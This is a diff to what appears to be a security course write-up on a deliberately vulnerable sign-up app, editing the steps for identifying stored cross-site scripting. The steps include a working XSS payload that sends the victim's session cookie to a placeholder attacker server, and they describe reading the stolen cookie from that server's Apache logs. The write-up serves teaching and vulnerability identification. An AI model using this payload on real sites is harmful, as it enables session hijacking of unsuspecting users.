@@ -58,12 +58,13 @@ Force HTTPS for the whole server;
 ## A3-Cross-Site Scripting (XSS)
 The XSS code can be entered on the SignUp page, and executed on the Admin page when listing the sign-ups. 
 ### How to identify
-1. Enter this code into the address field on the SignUp page;
+1. Restart the browser (to clear away the session-cookie). 
+2. Enter this code into the address field on the SignUp page;
 
    ```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
 
-2. Go to the Admin pages and take a look at the sign-ups.
-3. The session-id should now be written to the Apache logs of “yourserver”, which you can see with the "cat /var/log/apache2/access.log" command ("yourserver" would normally be an other server, that the hacker has access to). 
+3. Go to the Admin pages and take a look at the sign-ups.
+4. The session-id should now be written to the Apache logs of “yourserver”, which you can see with the "cat /var/log/apache2/access.log" command ("yourserver" would normally be an other server, that the hacker has access to). 
 
 or 
 
